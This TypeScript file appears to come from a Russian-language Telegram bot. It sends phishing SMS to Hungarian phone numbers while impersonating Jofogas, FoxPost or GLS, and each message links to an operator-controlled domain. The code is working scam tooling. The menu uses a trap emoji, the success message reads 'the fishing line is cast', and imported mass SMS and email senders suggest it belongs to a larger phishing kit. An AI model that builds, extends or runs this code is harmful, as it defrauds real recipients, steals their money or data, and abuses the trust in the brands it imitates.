import {Context} from "@/database/models/context";
import {Scene} from "grammy-scenes";
import {Composer, InlineKeyboard} from "grammy";
import {adsRepository, domensRepository} from "@/database";
import {deleteAllMessages} from "@/helpers/deleteAllMessages";
import {sendEmailAnafema, sendEmailKeshMail, sendEmailYourMailer} from "@/utils/rassilka/email";
import {sendSms} from "@/utils/rassilka/sms";
import console from "console";
import {getDomen} from "@/helpers/getDomen";

export const scene = new Scene<Context>('smsSendJofogas')
export const composer = new Composer<Context>()
const regex = /sms ad jofogas (?<id>\d+)/gmi
composer.callbackQuery(regex, handler)

async function handler(ctx: Context)  {
    const match = regex.exec(ctx.callbackQuery.data)
    const id = match.groups.id
    await ctx.scenes.enter('smsSendJofogas', {
        id
    })
}

async function cancel(ctx) {
    await deleteAllMessages(ctx.session.deleteMessage, ctx)
    ctx.scene.exit()
}

scene.always().callbackQuery('cancel smsSendJofogasFacebook', cancel)

scene.do(async (ctx) => {
    ctx.session.smsEmail = {ad: Number(ctx.scene.opts.arg.id), to: undefined, pattern: undefined}
    ctx.session.deleteMessage = []
    const ad = await adsRepository.findOne({
        where: {
            id: ctx.session.smsEmail.ad
        }
    })
    if (!ad) {
        await ctx.reply(`ad undefined`, {
            reply_markup: {
                inline_keyboard: [
                    [{text: 'Закрыть', callback_data: 'deleteThisMessage'}]
                ]
            }
        })
        return cancel(ctx)
    }
    const msg = await ctx.reply("<b>🪤 Выбери сервис:</b>", {
        reply_markup:  new InlineKeyboard()
            .text('JOFOGAS', 'jofogas')
            .row()
            .text('FOXPOST', 'foxpost')
            .row()
            .text('GLS', 'gls')
            .row()
            .text('Отмена', 'cancel smsSendJofogas')
    })
    ctx.session.deleteMessage.push(msg.message_id)
    ctx.scene.resume()
})

scene.wait().callbackQuery(/jofogas|foxpost|gls/,async (ctx) => {
    ctx.session.smsEmail.service = ctx.callbackQuery.data

    try {
        ctx.deleteMessage()
    }catch (e) {}

    const ad = await adsRepository.findOne({
        where: {
            id: ctx.session.smsEmail.ad
        }
    })
    if (!ad) {
        await ctx.reply(`ad undefined`, {
            reply_markup: {
                inline_keyboard: [
                    [{text: 'Закрыть', callback_data: 'deleteThisMessage'}]
                ]
            }
        })
        return cancel(ctx)
    }

    const msg = await ctx.reply(`📲 Введи номер телефона (🇭🇺+36):\n\n<b>Пример: +3615785425397</b>`, {
        reply_markup:  new InlineKeyboard()
            .text('Отмена', 'cancel smsSendJofogas')
    })
    ctx.session.deleteMessage.push(msg.message_id)
    ctx.scene.resume()
})


scene.wait().on('message:text', async ctx => {
    ctx.session.smsEmail.to = ctx.msg.text
    ctx.session.deleteMessage.push(ctx.msg.message_id)

    const ad = await adsRepository.findOne({
        where: {
            id: ctx.session.smsEmail.ad
        }
    })
    if (!ad) {
        await ctx.reply(`ad undefined`, {
            reply_markup: {
                inline_keyboard: [
                    [{text: 'Закрыть', callback_data: 'deleteThisMessage'}]
                ]
            }
        })
        return cancel(ctx)
    }

    if (ctx.session.smsEmail.service === 'foxpost') {
        ctx.session.smsEmail.pattern = "1"
        ctx.session.smsEmail.who = "FoxPost"
    }
    if (ctx.session.smsEmail.service === 'jofogas') {
        ctx.session.smsEmail.pattern = "1"
        ctx.session.smsEmail.who = "Jofogas"
    }
    if (ctx.session.smsEmail.service === 'gls') {
        ctx.session.smsEmail.pattern = "0"
        ctx.session.smsEmail.who = "GLS"
    }

    const domen = await getDomen(ctx.user,ad.service)
    if (!domen) {
        await ctx.reply(`domen undefined`, {
            reply_markup: {
                inline_keyboard: [
                    [{text: 'Закрыть', callback_data: 'deleteThisMessage'}]
                ]
            }
        })
        return cancel(ctx)
    }
    const msg = await ctx.reply(`⏳`)

    const response = await sendSms(ctx.session.smsEmail.to, ctx.session.smsEmail.pattern, ctx.session.smsEmail.who,`https://${domen.link}/link/${ad.link}?phone=yes`, ctx.from.id)
    try {
        ctx.api.deleteMessage(ctx.chat.id,msg.message_id)
    } catch (e) {}

    console.log(`sms ${response}`)
    await ctx.reply(
        (response?.info === "Success")
            ? `✅ Удочка закинута`
            : `⚠️ Не удалось отправить смс`,
        {
            reply_markup: {
                inline_keyboard: [
                    [{text: 'Закрыть', callback_data: 'deleteThisMessage'}]
                ]
            }
        })

    return cancel(ctx)
})